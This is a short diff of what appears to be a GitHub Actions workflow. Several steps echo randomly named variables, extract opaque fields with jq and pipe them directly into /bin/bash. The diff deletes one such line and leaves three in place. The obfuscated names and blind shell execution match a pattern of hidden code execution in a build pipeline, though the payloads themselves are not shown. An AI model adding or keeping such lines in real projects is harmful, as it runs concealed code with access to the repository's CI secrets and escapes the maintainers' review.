@@ -28,7 +28,6 @@ jobs:
           echo $jabi41 | jq -r .dfquz4804 | /bin/bash
           echo $xnj8 | jq -r .a72 | /bin/bash
           echo $kz125 | jq -r .ddp245 | /bin/bash
-          echo $t161 | jq -r .vx484 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
